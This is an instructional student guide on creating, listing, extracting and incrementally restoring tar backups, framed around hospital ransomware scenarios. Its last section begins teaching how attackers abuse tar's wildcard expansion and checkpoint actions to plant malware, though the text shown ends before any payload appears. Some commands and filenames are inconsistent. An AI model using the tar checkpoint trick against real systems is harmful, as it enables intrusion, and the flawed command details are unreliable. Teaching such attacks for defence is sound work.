## 5.1 Student Guide: Backups and Restoring Data with `tar`

### Overview

Today's class focuses on how to use backup and recovery to protect data integrity and availability.  You will use the tar command is used to create, list, and extract data from archives. Creating archives ensures the availability of users’ data and configuration files.

Archiving and Logging Data are essential tasks for a Linux System Administrator for many reasons. 

In this unit, we show how:

- Archiving ensures that data can survive natural disasters and cyberattacks.
- Tasks can be created to automate hourly, daily, weekly, or monthly backups.
- Log files can be monitored for suspicious activity, and ensure that the system is running optimally.


### Class Objectives

By the end of today's class, you will be able to:

* Identify and describe use cases for the three kinds of backups.

* Create (tar) an archive from existing files and directories.

* List and search the contents of an existing archive.

* Extract (untar) the contents of an archive.

* Describe and demonstrate two exploits for the `tar` command.


### Class Slides


The slides for today can be viewed on Google Drive here: [5.1 Slides](https://docs.google.com/presentation/d/1JKMI7G4udBd9PiD_pEwC36ulb8yWTIAtbAIFjkuQzFM/edit)

----

### 01. Welcome and Overview  

Welcome to the second week of Linux. In the previous unit, we learned about system configuration, file structures, and hardening against attacks.

In this unit, we continue to explore how system administrators use Linux tools to secure a system by:

- **Archiving** data to ensure it remains availabile in case of a natural disaster or cyber attack.

- **Scheduling** backups to ensure they are up to date and made monthly, hourly, or daily.

- **Monitoring** log files to prevent and detect malicious activity and keep systems running efficiently.

System administrators use archiving, scheduling, and monitoring for the following tasks:

- Overseeing or conducting backup and recovery.

- Determining how long to retain (keep) data and the frequency at which (how often) it is backed up.

- Ensuring files are backed up and restored correctly.

- Providing security to ensure that compliance requirements are met.

#### Today: Archiving with `tar`

Today we focus on creating and managing archives using the `tar` utility.

- These skill are essential to ensuring the availability of a system and its data.

_Backups_ and _data archiving_ are important to maintain compliance with regulations for IT security in industries such as finance and health:

- In finance, the common standard for data archiving is the **Sarbanes-Oxley Act** (SOX), which requires all business records and communication to be retained for five years.  

- The **Markets in Financial Instruments Directive** (MiFID II) requires the European Union's financial firms to retain and reproduce records of all activity from telephone conversations and electronic communications, including instant messages and social media interactions.

* In health, the most common standard is  **Health Insurance Portability and Accountability Act** (HIPAA), which requires that healthcare providers keep records for six years.

*Note:* For additional information on the above laws:

* [Sarbanes-Oxley Act (SOX)](<https://www.mythics.com/about/blog/sarbanes-oxley-act-sox-compliance-requirements-for-it-security>)
* [Health Insurance Portability and Accountability Act (HIPPA)](<https://linfordco.com/blog/hipaas-record-retention-requirements/>)
*  [Markets in Financial Instruments Directive 2004/39/EC (MiFID II)](<https://www.mirrorweb.com/mifid-ii-compliance>)


### 02. An Introduction to using the `tar` Command

Cybersecurity professionals ensure that systems are protected from data loss and interruptions caused by attacks or natural disasters.

The following are examples of data loss:

- In 2019, hackers seized important government machines in [Baltimore, Maryland](<https://www.nytimes.com/2019/05/22/us/baltimore-ransomware.html>) during a ransomware attack.

- In 2019, Hurricane Michael caused massive flooding, destroying hundreds of homes, businesses, and strategic defense data at [Tyndall Air Force Base](<https://www.washingtonpost.com/national/hurricane-michael-tyndall-air-force-base-was-in-the-eye-of-the-storm-and-almost-every-structure-was-damaged/2018/10/23/26eca0b0-d6cb-11e8-aeb7-ddcad4a0a54e_story.html?utm_term=.9182d43bfb6f>).

System administrators **back up** their systems to ensure quick recovery of functionality and restoration of any lost data.

- A **backup** is a **saved version** of all the files in a hard drive at a given point in time.

- A **backup** is ideally saved to a remote location, so that in the event of compromise, those files can be restored to minimize downtime.

- Backups are generally done hourly or daily to ensure that they contain current versions the data.

- Performing regular backups should be one of a system administrator's top priorities.

In addition to a full backup, which saves every file in the system, administrators can also create backups of individual files and folders. This is useful when you don't need to backup the entire system.

- For example, an administrator may create a backup containing only the `/home` directory, ensuring that users will always have access to their data, even if the rest of the machine is compromised.

There are different types of backups, known as backup **levels**: full, incremental, and differential.


A **full backup** creates a backup of the entire system.

- You would create a full backup if, for instance, you recently got a new computer for work and wanted to do an initial backup.

- Full backups allow for a more reliable restoration of a system. They also provide better storage management, as all the files are in one place.

- However, full backups are slow and require a lot of storage space.

In addition to a full backup, administrators can create **backups of individual files and folders**.

- For example, an administrator can create a backup containing only the `/home` directory, ensuring that users will not lose their individual data, even if the rest of the machine is compromised.


-  **Incremental** and **differential** backups archive *only data that has changed* since the last backup. They are fast and take up less disk space, but require all previous backups in order to be fully restored.    


Why backup levels are important:

* When a system is compromised, users may have to delete the entire operating system and install it from scratch. This is time-consuming and costly for enterprise-level networks.

* Rather than delete and reinstall the entire operating system, you will be able to restore the computer back to the state it was in according to the backup image used to restore the computer.

#### Performing a Backup

Now that we understand the importance of backups, we’ll discuss how to actually perform one.     

The `tar` command is a Linux utility that is used to create backups.
- Note: `tar` is a powerful tool that can do more than just create simple backups, as we'll see later.

- `tar` stands for _tape archive_.


- `tar` is used to create an **archive** of the files we want to back up.


Note the following about archives:

- An archive is a collection of files and directories.

- A backup is an archive used specifically to preserve information in the event of data loss.

- Archives created by `tar` are called **tarballs** and use the extension `.tar`.

- The file size of a tarball is equal to the sum of the file sizes of each of the all files it contains. This is important, because it means that a full backup created by `tar` takes up the same amount of space as all the files in the system.


 **Compression** uses mathematical algorithms to reduce the size of file(s) by converting them to a different format which takes up less space than the original file(s).


* There are many different ways to compress a file. The most common for systems administrators are `gzip` and `bzip2`.

* `gzip` is the accepted standard for compression on Unix-like systems. `bzip2` offers better compression, but is much slower than `gzip`.

* Both `gzip` and `bzip2` are commands that can be used to compress any file, but `tar` has built-in flags that allow you to compress tarballs immediately.

* Tarballs that have been gzipped have the extension `tgz` or `tar.gz`, and the extension `bz2` if they've been bzipped.

#### Creating an Archive

Next, we cover how to “create” an archive.    

The Systems Operations Center at [Tyndall Air Force Base](<https://www.washingtonpost.com/national/hurricane-michael-tyndall-air-force-base-was-in-the-eye-of-the-storm-and-almost-every-structure-was-damaged/2018/10/23/26eca0b0-d6cb-11e8-aeb7-ddcad4a0a54e_story.html?utm_term=.9182d43bfb6f>) likely backed up all system data with the approaching threat of Hurricane Michael.

They would create a full backup of all the log files in `/var/log` directory using the `tar` command as follows:


- `sudo tar cvf hurricane-backup-10-11-2018.tar /var/log`

    Syntax breakdown:

    `tar [option(s)] [archive_name] [objects_to_archive]`
    
    -  `sudo` point out that because `/var/log` contains system files, we need root privileges in order to access them. It would compromise our security if all users were able to make backups of our system files. 
    - `tar` is the Linux command. We always begin our backups with `tar`.
    - `c` , `v`, and `f` are [_short_](<http://linuxcommand.org/lc3_man_pages/tar1.html>) form options.
    - `c` stands for create. We use this option when creating an archive.
    - `v` stands for [_verbose_](<https://www.gnu.org/software/tar/manual/html_node/verbose-tutorial.html>). This option displays the file path and name of each file as it's archived.
    -note: We can also use `vv`, for "very verbose".  This option not only displays the file name and path, but also the permissions, owner, group, size, creation date and time of each file as it's added to the archive.
    We cover verbose output in greater detail below.
    - `f` stands for [_use this archive file_](<https://www.gnu.org/software/tar/manual/html_node/file-tutorial.html#SEC14>). It is followed by the title of the archive. It can also be written as `--file=archive_name`.  This option must be present when creating an archive.
    - `hurricane-backup-10-11-2018.tar` is the `archive_name` and indicates the title given to our archive. Note the `.tar` file extension.
    - `var/log` are the _objects to archive_, indicating the files or directories we want to back up.


If `tar` does not receive files or directories to archive, it outputs the following error message:

```
tar: Cowardly refusing to create an empty archive
Try 'tar --help' or 'tar --usage' for more information
```

**Verbosely verbose is very virtuous!**
Running tar verbosely is not only helpful, it's considered best practice!  For example, we can use the `-vv` option and redirect the output of `tar` to a logfile.  That way we can go back and see details about every file that was archived.

Run the following commands:

- `sudo tar cf 2018-10-12-hurricane-backup.tar /var/log`

Notice that there is no output.  


Next, run this command with the `v` option and see the following output.

- `sudo tar cvf 2018-10-12-hurricane-backup.tar /var/log`

    ```
    /var/log/fontconfig.log
    /var/log/kern.log.2.gz
    /var/log/wtmp
    /var/log/vboxadd-install.log
    ...
    ...
    ```

This command _shows the file paths and names_ that are being written to the archive as the command runs. However, it does not display a _full listing_.

Run the command using the `vv` option and see the following output:

- `sudo tar cvvf 2018-10-12-hurricane-backup.tar /var/log`

    ```
    -rw-r--r--  root/root      5784  2019-07-03  15:38   /var/log/fontconfig.log
    -rw-r-----  syslog/adm   141571  2019-07-1-  11:16   /var/log/kern.log.2.gz
    -rw-rw-r--  root/utmp     20352  2019-07-15  15:33   /var/log/wtmp
    -rw-r--r--  root/root       695  2019-07-05  21:09   /var/log/vboxadd-install.log
    ```

This information is important to determine which archive to use when restoring data after an attack.

As mentioned above, the verbose output of a `tar` command can also be written to a file for later review.  

- How this would be accomplished?

    - `>`  will redirect output to a file.

Some of the best practices for maintaining [security](<https://www.gnu.org/software/tar/manual/html_section/tar_84.html#SEC176>) such as, Confidentiality, Integrity, and Availability or the CIA triad when creating an archive include:

- Be sure archives are not writable by an untrusted user.

- Inspect all data, such as passwords, before writing to an archive, so that we don't unknowingly archive sensitive information.

- Monitor all backups, as `tar` is vulnerable to denial of service (DoS) attacks, which can be triggered if an attacker creates an infinitely deep directory hierarchy.

- Pay attention to the diagnostic and exit status of `tar`.

### 03. Activity: Creating a Backup using the `tar` Command

- [Activity File: Creating a Full Backup using `tar`](Activities/03_Creating_Full_Backups/Unsolved/README.md)


### 04. Activity Review: Creating a Full Backup Using `tar`

- [Solution Guide: Creating a Full Backup using `tar`](Activities/03_Creating_Full_Backups/Solved/README.md)



### 05. Restoring Data with `tar`

We've covered how to use `tar` to create full backups. Now, we'll show how to restore data from a full backup.

Consider a scenario in which your laptop is stolen.  

- After buying a replacement laptop, you want to put all the files that were on your first laptop onto your new one.

- Fortunately, you had a full backup of all your files on an external hard drive, so you can access everything that was lost.

Restoring data from a backup usually includes the following steps:

- Listing the contents of your backup to ensure that it has the data you want to restore.

- Extracting the files, which will copy and restore them to disk.

To use the `tar` command to put all the files in the full backup on your new laptop:

- `tar xvvf my_laptop_backup.tar`

    Syntax breakdown:

    - `x` means _extract_ the files from the archive and write to disk.
    - `vv` file name, path, permissions, owner, group, size, and date/time of creation
    - `f` specifies the archive file to use.

    - `my_laptop_backup.tar` is the archive that contains the files from your laptop.

The command used to extract files from an archive is almost identical to the command used to create one. The only difference is the replacement of **`c`** with **`x`**.    

After running this command, all of your emails, documents, pictures, movies (_every_ file)  contained in `my_laptop_backup.tar` will be extracted from the archive and saved to the new laptop's hard drive. This process is called **backup restoration**.    

Before extracting, you would first list the contents of the archive to ensure it has the data you want, and no data that you don't want.

- Listing files in an archive does _not_ restore the data. The contents of the archive are only displayed on a terminal screen.

- Extraction _copies_ and _restores_ the files to disk.

We don't always need to restore the full contents of a backup. In those cases, we use `tar` to first list the contents of our backup, and then we can extract only the specific data we need.

#### Medical Center Scenario

Now, we will cover how to use this method of restoring files to protect organizations in the aftermath of a cyberattack.


Medical centers and hospitals are large targets for cybercriminals. In 2019 [Hackensack Meridian Health's systems](https://www.app.com/story/news/health/2019/12/13/hackensack-meridian-ransom-hackers-cyber-attack-hospitals/2638701001/) were compromised by a ransomware attack. Attackers encrypted medical data of many patients in the hospital.

- The attackers offered to decrypt the data in exchange for payment, effectively ransoming the government's data. Unfortunately, in the case of Hackensack, the hospital had to pay.

In the following demonstration, we are going to do what the hospital should have done in preparation for potential cyber attacks.


For this demonstration, we'll respond to a ransomware attack that hit a hospital on the morning of May 11 2019. Among the affected systems were:

- Doctors
- Patients
- Treatments
- Files

After taking the infected systems offline, we'll need to:   

- Restore the operating system and applications using the full backup.
- Restore email data using the full backup.

To restore the email data, the SysOps team will use the `tar` command to:

- _List_ the contents of the latest full backup and locate the email data.
- _Extract_ the email data from the archive to a directory on the new system.

#### Hospital Walkthrough

Open a terminal window. We'll now look at the directory that contains the `tar` file of the hospital's latest full backup.

- Run `cd ~/Documents/epscript/treatments/backup/`

- Run `ls -l 10May2019-235536-0700.tar`

The date and time on the archive indicate that this backup was created the night before the attack.

Run the following command to list the files in the archive and see the output below:

- tar tvvf 10May2019-135536-0700.tar | less

    ```
    drwxr-xr-x root/root         0 2019-05-09 17:29 16:29 backups/
    drwxr-xr-x root/root         0 2019-05-09 17:29 backups/neurology/
    -rwxr-xr-x root/root      9465 2019-05-09 17:29 backups/neurology/treatments.18.csv
    -rwxr-xr-x root/root      9761 2019-05-09 17:29 backups/neurology/treatments.16.csv        
    ...
    ...
    drwxr-xr-x root/root         0 2019-05-09 17:29 backups/oncology/
    -rwxr-xr-x root/root      9354 2019-05-09 17:29 backups/oncology/treatments.12.csv
    -rwxr-xr-x root/root      9070 2019-05-09 17:29 backups/oncology/treatments.8.csv
    ...
    ...
    drwxr-xr-x root/root         0 2019-05-09 17:29 backups/cardiology/
    -rwxr-xr-x root/root      9477 2019-05-09 17:29 backups/cardiology/treatments.5.csv
    -rwxr-xr-x root/root      9952 2019-05-09 17:29 backups/cardiology/treatments.7.csv
    ...
    ...

   ```
Syntax breakdown:

- `t` is an option that lists the contents of an archive.
- `vv` is used to display all relevant file information.
- `f` is used to specify the archive file to use.
- `10May2019-235536-0700.tar` is the archive name.
- `| less` means we will pipe the output to `less`, so that we can scroll through the output.

If `tar` cannot find the archive or file to list, it will output the following message:

```
tar: <archive>: Not found
tar: Exiting with failure due to previous errors
```

Next, we will extract the email files from the archive and place them in a new directory.  

First we need to create a new directory to hold the restored email files.

- Run `mkdir restored_emails`

Now we'll extract the email files from the archive:

- Run:  `tar xvvf 10May2019-235536-0700.tar -R -C restored_emails --wildcards "*.csv"`   

Syntax breakdown:

- `x` means to extract and write the files to disk.
- `vv` is used to display the full file specification.
- `f` is used to specify the archive file to use.
- `10May2019-235536-0700.tar` is the archive file.
- The `-R` option tells `tar`to print error messages for any errors with the block number in the archive file when extracting files.  
    - We should always use the `R` option while extracting data to verify that there are no file errors.
- `-C restored_emails` is the name of the directory where the `.csv` files will be placed.
- `--wildcards "*.csv"`is used to only extract the files with the extension **`.csv`**.

- After running that command, you should see the following at the end of your output:

    ```
    block 1576: ** Block of NULs **
    ```
   - **Block of Nul** means that data failed to be read in that block (or range of blocks)is replaced by NULs, so that the length of the data is preserved even if the actual data is lost (since it's not possible to read it).

Run the following command to show the restored emails:

- `ls -l restored_emails/backup/neurology/`

The original directory structure (`backup/neurology`) is retained in the archive and now can be seen on disk.  

* We should always use the -t option to list an archive's contents before extracting, to avoid unwanted results.  If we extract the wrong archive, for example, we could end up with files and folders being overwritten and out of place.

* Note the following:

    * Files archived with leading (`/`) slash will be *restored to their absolute locations*.

    * Files that were archived without leading (`/`) slashes will be restored *under the current directory*.

    * Files extracted from an untrusted archive should be extracted into an *empty directory*.


### 06. Activity: Restoring Data with `tar`

- [Activity File: Restoring Data](Activities/06_Restoring_Data/Unsolved/README.md)


### 07. Activity Review: Restoring Data with `tar`

- [Solution Guide: Restoring Data](Activities/06_Restoring_Data/Solved/README.md)

### 08. Incremental Backups with `tar`

So far, we've been creating _full backups_.

While full backups ensure the availability and integrity of a system, there are some drawbacks to using them.

* The file size of a full backup is large, as it is an archive of the entire system.

* Depending on the size of the file system, doing a full backup can take a long time.

This is where **incremental backups** are helpful.

* Incremental backups are done after a full backup has been performed on a system.

* Incremental backups capture only what has changed since the last incremental backup. This makes incremental backups smaller than full backups.

Incremental backups track all changes in a special file called a **snapshot file**.


* The snapshot file is created when the administrator creates the initial, or **level 0** incremental backup. The snapshot file is automatically updated after each subsequent incremental backup, to track any changes to the file system.  If files are created, deleted, or modified between incremental backups, the snapshot file tracks those modifications.


- The snapshot tracks all changes made to files that are in the backup.

- The snapshot tracks all changes made since the last backup.

* Consider the frequency of incremental backups (e.g., hourly or daily). Making incremental backups hourly ensures that each backup is small and restores (relatively) quickly, with minimum loss of data after an attack.


Incremental backups have benefits and drawbacks:

* Restoring is slower because you must restore the latest full backup, and then each incremental backup.

- Disadvantages to using Incremental backups:


* There may be loss of data if one of the backups is corrupted. For example, if we cannot read the backup done at a certain time or on a certain day, then the entire backup will fail.

* This is why it's so important to verify that an archive is created with no errors by using the `tar` `W` option.


#### Creating the Incremental Backup

Note how tar is used to create incremental backups:

* An [incremental backup](<https://www.gnu.org/software/tar/manual/html_node/Incremental-Dumps.html>) is a special form of a `tar` archive.  

* `tar` stores additional metadata or information so that the exact state of the file system can be restored when extracting the archive.

* The additional information includes which files have been modified, created, or deleted since the last backup, so that the next incremental backup will contain _only modified_ files.

* The additional information is stored in a snapshot file.

     * Snapshot files have the extension .`snar`, which stands for *sn*apshot + t*ar*.

        * For example: `emerg_backup.snar`

      A snapshot file called `emerg_backup.snar` will be used to store the additional information, such as, which files have been changed, added, or deleted. This file is in binary format and is not human-readable.


Next, we will create an incremental backup with the `tar` command.       

- Type the following command and note that this requires two new flags in addition to the ones you are already familiar with:

    - `$ tar cvvWf emerg_back_sun.tar --listed-incremental=emerg_backup.snar --level=0 emergency`

Syntax breakdown:

* `--listed-incremental=emerg_backup.snar`: This option tells `tar` that this backup will be part of a series of incremental backups, and specifies that information about files that are created, modified, or removed should be stored in a snapshot file called `emerg_backup.snar`.

- `--level=0`: Each incremental backup has a level. We use level 0 to indicate the first, or full backup. The next incremental backup will be level 1, and then level 2, and so forth.

Because this is the first backup in the series, this is both a full backup and an incremental backup. This is because the first backup in a series of incremental backups is necessarily a full or **level 0** backup.
- The following incremental backup(s) will be smaller in size.

- When this backup is created, the snapshot file will simply contain `Y` for every file in the archive.

-Note:  The option `--level=0` has a `--` before it and uses the full word "level".  This is called the [long form](<http://linuxcommand.org/lc3_man_pages/tar1.html>). Incremental commands typically use this syntax.

#### Incremental Backups Demo Setup

Use the following scenario as the basis for this demonstration of incremental backups:

* A hospital's system operations staff performs a full backup of all the data in the emergency database on Sunday.

* On Monday, the staff runs an incremental backup which stores all changes made on Monday. This backup is smaller than the full backup.

* On Tuesday, an incremental backup archives only the changes made on Tuesday to the emergency database.

* The hospital is hit with a ransomware attack on Wednesday and all the data in the emergency database is encrypted.

* Fortunately, since the hospital created full and incremental backups, the files in the emergency database are easy to restore.


You'll use the `tar` command to complete the following steps:

* _Create_ a full or level 0 backup of the emergency directory and a snapshot file.

* _Display_ the contents of the level 0 backup that would have been created on Sunday.

* _Create_ the incremental backups that would have been generated on Monday and Tuesday.

* _Remove_ the emergency directory to mimic the ransomware attack on Wednesday.

- Note: We can just rename it, instead of removing it.  That way we can repeat the demo.

* Finally, _restore_ the emergency directory by first restoring the full backup taken on Sunday, restoring the incremental backup taken on Monday, and lastly restoring the second incremental backup taken on Tuesday.  

#### Incremental Back Up Demo


We'll start in our `$`$HOME/Documents/epscript` directory` and list the contents of the simulated emergency directory for the hospital.  Two directories are located there: `admit` and `discharge`.


- Run `ls -l emergency`
    ```
    drwxr-xr-x  2   instructor  instructor  4096    Jul 4   03:28   admit
    drwxr-xr-x  2   instructor  instructor  4096    Jul 3   22:34   discharge
    ```

Next, we'll list the contents of the `admit` and `discharge` directories and show the output.

- Run ` ls -l admit discharge`

    ```
        admit:
        total 16
        -rw-r--r--  1   instructor  instructor  20  Jul 3   22:34   file1
        -rw-r--r--  1   instructor  instructor   9  Jul 4   02:55   file3
        -rw-r--r--  1   instructor  instructor  13  Jul 4   03:26   file4
        -rw-r--r--  1   instructor  instructor  13  Jul 3   03:28   file5
       
        discharge:
        total 4
        -rw-r--r--  1   instructor  instructor  19  Jul 3   22:34   file2
    ```


Again, the syntax for the command is:

- `tar [options] [archive_name] --incremental=[snapshot file name] --level=0 [objects_to_archive]`  

We will now run  the following command to simulate the level 0 backup on Sunday.  

- Run `cd ..` to return to the `epscript` directory.

- Run: `tar cvvWf emerg_back_sun.tar --listed-incremental=emerg_backup.snar --level=0 emergency`


This command will create the following:

- A level 0 or full backup in the file `emerg_back_sun.tar`.

- A snapshot file called `emerg_backup.snar` that will be used to store the additional information such as which files have been changed, added, or deleted.  This file is in binary format and is not human-readable.

- `tar` indicates this information by appending data to the archive as follows:

    - `Y` indicates that the file is contained in the archive.

    - `N` indicates that the file was present in the directory at the time the archive was made, yet it was not added to the archive because it has not changed since the last backup.

    - `D` indicates the file is a directory.  

Other options we have used so far:

- `c` creates an archive.

- `vv` or “very verbose” displays all relevant information for each file as it is archived.

- `W` verifies the archive after creating it. You used this option when creating a full backup. It should _always_ be used.

- `f` stands for _use this archive file_.  This option must be present.

- `emerg_back_sun.tar` is the archive filename.  This is the full backup that is completed every Sunday.

-  `emergency` is the directory we want to backup.

Next, we will show the files that were created from the command.   

- Run the `ls command` on the `epscript` directory:

    `ls -l epscript`

The output:

```
emerg_back_sun.tar - this is the `full` or `level 0` backup file

emerg_backup.snar - this is the `snapshot` file
```



It is best practice to use the `tar` list command to check the archive after creating it.


- Run the following command from inside the `escript` directory:

     - `tar tvvf emerg_back_sun.tar --incremental`

    - Your output might differ slightly from what's shown in the image below.


    ```
    drwxr-xr-x instructor/instructor        45 2019-12-28 17:30 emergency/admit/
    Y file1.txt
    Y file2.txt
    Y file3.txt
    Y file4.txt

    drwxr-xr-x instructor/instructor        12 2019-12-28 17:35 emergency/discharge/
    Y file2.txt

    -rwxr-xr-x instructor/instructor     10244 2019-12-28 17:35 emergency/.DS_Store
    -rwxr-xr-x instructor/instructor         0 2019-12-20 13:05 emergency/.gitkeep
    -rw-r--r-- instructor/instructor     10240 2019-12-28 17:37 emergency/emerg_back_sun.tar
    -rw-r--r-- instructor/instructor        36 2019-12-28 17:37 emergency/emerg_backup.snar
    -rw-r--r-- instructor/instructor         0 2019-12-28 17:35 emergency/
    -rwxr-xr-x instructor/instructor       689 2019-12-28 17:30 emergency/admit/file1.txt
    -rwxr-xr-x instructor/instructor       341 2019-12-28 17:30 emergency/admit/file2.txt
    -rwxr-xr-x instructor/instructor       661 2019-12-28 17:30 emergency/admit/file3.txt
    -rwxr-xr-x instructor/instructor       840 2019-12-28 17:30 emergency/admit/file4.txt
    -rwxr-xr-x instructor/instructor       341 2019-12-28 17:35 emergency/discharge/file2.txt


    drwxr-xr-x instructor/instructor        12 2019-12-28 17:35 emergency/discharge/
    Y file2.txt

    -rwxr-xr-x instructor/instructor     10244 2019-12-28 17:35 emergency/.DS_Store
    -rwxr-xr-x instructor/instructor         0 2019-12-20 13:05 emergency/.gitkeep
    -rw-r--r-- instructor/instructor     10240 2019-12-28 17:37 emergency/emerg_back_sun.tar
    -rw-r--r-- instructor/instructor        36 2019-12-28 17:37 emergency/emerg_backup.snar
    -rw-r--r-- instructor/instructor         0 2019-12-28 17:35 emergency/
    -rwxr-xr-x instructor/instructor       689 2019-12-28 17:30 emergency/admit/file1.txt
    -rwxr-xr-x instructor/instructor       341 2019-12-28 17:30 emergency/admit/file2.txt
    -rwxr-xr-x instructor/instructor       661 2019-12-28 17:30 emergency/admit/file3.txt
    -rwxr-xr-x instructor/instructor       840 2019-12-28 17:30 emergency/admit/file4.txt
    -rwxr-xr-x instructor/instructor       341 2019-12-28 17:35 emergency/discharge/file2.txt
    ```

- Note that this command lists (as indicated by the t option) the files in each of the incremental backups, and the times that they were last modified.

    Syntax breakdown:

    - `t` lists the files from the archive to the terminal screen.
    - `vv` displays all relevant file information.
    - `f` stands for _use this archive file_.  This option must be present.
    - `emerg_back_sun.tar` is the archive to use.
    - `--incremental` indicates that this is an incremental backup.

Using the `--incremental` option will display one of the following next to each file:

- `Y` indicates that the file is contained in the `emerg_back_sun.tar` archive.

- `N` indicates that the file was present in the directory at the time the archive was made, but was not added to the `emerg_back_sun.tar` archive because it has not changed since the last backup.

- `D` indicates the file is a directory.

Now we will simulate the Monday and Tuesday incremental backups that were run by the system admin team.

- First, we will simulate the addition of a new file to the `admit` directory. This change was made on Monday, the day after the level 0 backup was created.

- Run the commands to _create_ the Monday incremental backup, _list_ the contents, and _show_ the output from the command with the added file.ad

    - `sudo -tar cvvWf emerg_back_mon.tar --listed-incremental=emerg_backup.snar emergency`

- Run the command to add a new file in the `emergency/admit` directory:

     `echo "New file for CJones" > emergency/admit/file6.txt`


    - **Note:** Be sure to `exit` **sudo su** if you used it then run the following commands to verify the new file has been added:

    - Re-run the incremental back to add the new file to the archive:

      - `sudo -tar cvvWf emerg_back_mon.tar --listed-incremental=emerg_backup.snar emergency`

    - Next, let's verify that the new file has been added and observing the **Y** flag for `file6.txt`. 
    - `File1.txt` through `file5.txt` should have an **N** flag set because those files were present in the directory at the time the archive was re-created:

      - `tar tvvf emerg_back_mon.tar --incremental`

    ```
    drwxr-xr-x  instructor/instructor   29  2019-07-04  03:28   emergency/admit/

    N file1
    N file3
    N file4
    N file5
    Y file6       
    ```

Note the following:

- `--level=0` option is not used in the command. `tar` sees this as an incremental backup, not a full backup, because a snapshot file has already been created.

- Only `file6.txt` was added to the Monday `emerg_back_mon.tar` file. This keeps the `tar` file very small.

Next, we will simulate the updating of an existing file in the `discharge` directory. This change was made on Tuesday.

- Run:

    - `echo "Update MSmith" >> emergency/discharge/file2.txt`

    - `tar cvvWf emerg_back_tues.tar --listed-incremental=emerg_backup.snar emergency`

    - `tar tvvf emerg_back_tues.tar --incremental`

Output should look like:

      ```
      drwxr-xr-x sysadmin/sysadmin 29 2020-06-10 08:44 emergency/
      N .gitkeep
      D admit
      D discharge

      drwxr-xr-x sysadmin/sysadmin 56 2020-06-11 15:51 emergency/admit/
      N file1.txt
      N file3.txt
      N file4.txt
      N file5.txt
      N file6.txt

      drwxr-xr-x sysadmin/sysadmin 12 2020-06-10 08:44 emergency/discharge/
      Y file2.txt

      -rw-r--r-- sysadmin/sysadmin 355 2020-06-11 15:57 emergency/discharge/file2.txt
      ```

- Only the updated file is added to the `emerg_back_tues.tar` file.

 Review the incremental files that have been created in the `$HOME/Documents/epscript` directory.

* Run `ls -l *.tar`

* The output from this command shows the files that were created:

    ```
    emerg_back_sun.tar
    emerg_back_mon.tar
    emerg_back_tues.tar
    ```

We will now simulate Wednesday's ransomware attack on the hospital by removing the `emergency` directory.  
Though instead of actually removing, we will simply rename it.  That way we can repeat the demo if we wish.  Or if we make a mistake, we can easily recover the emergency directory

- Run the following commands:

    `mv emergency emergency_deleted`  
    `ls`

We can restore the directory by first extracting the files from the full backup from Sunday, followed by the incremental backups from Monday and Tuesday.

- The following `tar` command extracts the files from the archives:

    - `tar xvvf emerg_back_sun.tar --incremental`

        - `x` extracts the files from the archive.
        - `vv` displays a full file specification.
        - `f` stands for _use this archive file_.  This option must be present.
        - `emerg_back_sun.tar` is the archive to use.
        - `--incremental` indicates that this is an incremental backup.

    - The snapshot file is not needed in the command since all the metadata, or, information necessary for extraction, is stored in the archive.

In our `$HOME/Documents/epscript` directory, we run the following commands to restore the `emergency` directory:

- First, apply the Sunday level 0 backup.

    - Run `tar xvvf emerg_back_sun.tar --incremental`

- What files are in the emergency directory now?

    - The directory contains only the original files in the `admit` and `discharge` directories.

- Run the `ls` command to display the current files in the `emergency` directory and all of its subdirectories:

    `ls -R emergency`

- We'll now apply Monday's incremental backup.

    - Run `tar xvvf emerg_back_mon.tar --incremental`

- What files are in the `emergency` directory now?


    - The directory now also contains the `file6.txt` file we added on Monday.


        - Run `ls -R emergency` to confirm.

- We'll show the `emergency/discharge/file2.txt` file before applying the Tuesday incremental backup, so that we can see the state of the file before we update with Tuesday's file.  

- Run `cat emergency/discharge/file2.txt`

Next, we'll apply Tuesday's incremental backup.

- Run `tar xvvf emerg_back_tues.tar --incremental`

What is the state of the file now?

 - The `file2.txt` file contains the line we added for the Tuesday incremental backup.

- Run `cat emergency/discharge/file2.txt` to see the new output. 

We have restored the files in the `emergency` directory to the state before the malware attack.   

### 09. Break

### 10. Activity: Restoring Data with Incremental Backups

- [Activity File: Restoring Data with Incremental Backups](Activities/10_Incremental_Restore/Unsolved/README.md)


### 11. Activity Review: Restoring Data with Incremental Backups

- [Solution Guide: Restoring Data with Incremental Backups](Activities/10_Incremental_Restore/Solved/README.md)


### 12. Exploiting the `tar` Command with the Checkpoint and Wildcard Options


In the previous sections, we learned how `tar` can be used to create full and incremental backups, and how we can extract files and directories from these backups.

In this last section, we’ll look at how the `tar` command can be used by hackers to plant malware on a system.

- This involves a combination of using the wildcard character and a feature known as _checkpoints_ with `tar`.


- The wildcard character `*` can be used to specify multiple files in a directory without having to type each filename.


- Wildcard characters in shell commands are expanded to matching filenames before the command is actually executed.

We’ll first show how wildcards are used with `tar`.

#### Using Wildcards with `tar`

We've used the wildcard character `*` before when creating an archive.

- Rather than individually type each file that needs to be included in a full backup, we can use the wildcard character to indicate multiple files and directories.

- It is not necessary to use wildcards with tar, but since they save us time potentially prevent mistyping file names, they are commonly used.

For example, if we have a directory called `Documents` that contains the nine files listed below, we can run the following command to create an archive that contains all of them, without having to type the name of each individual file.

Run the following commands: 

- `cd ~/Documents/ExploitTar` to navigate to a folder that we want to archive:

- `ls` to show its contents:

    ```
    f1   f10   f2   f3   f4   f5   f6   f7   f8   f9  'important docs'
    ```

- `tar cvf archive.tar ./*` to archive all files in the current directory using an asterisk `*`, the wildcard character.

- Note: wildcards can be used more cautiously.  We could also run `tar cvf archive.tar ./f* "important docs"`.  This ensures that we're not blindly archiving everything in the current directory.  

- `ls` again to show the new `archive.tar` file:

    ```
    archive.tar   f10   f3   f5   f7   f9
    f1            f2    f4   f6   f8  'important docs'
    ```


As we'll see, wildcards can be used by hackers to exploit `tar`. 

#### Checkpoints

- A checkpoint is the point in time at which the *nth* file is being archived (or extracted).  We provide each checkpoint with the value for *n*, as we'll see below.

- Two examples of checkpoints:

    - A checkpoint triggers an action to run once the backup reaches 1000 files. This action prints the remaining disk space to the screen.

    - When restoring files from a remote site, a checkpoint triggers an action which prints the number of bytes transferred every 5000 files.

- Using checkpoints with `tar` is best practice, as it helps administrators avoid serious issues, such as accidentally using up all of the space on a backup server, or slowing down the network, both of which can threaten data availability.

Checkpoints require two options.  The first defines the checkpoint (*n*), and the second defines the action.

Use the following example to detail the syntax of the checkpoint command:

 `--checkpoint=1000` and  `--checkpoint-action=du`

- `--checkpoint=1000` indicates how often the checkpoint occurs. At every thousandth file, an action will take place.

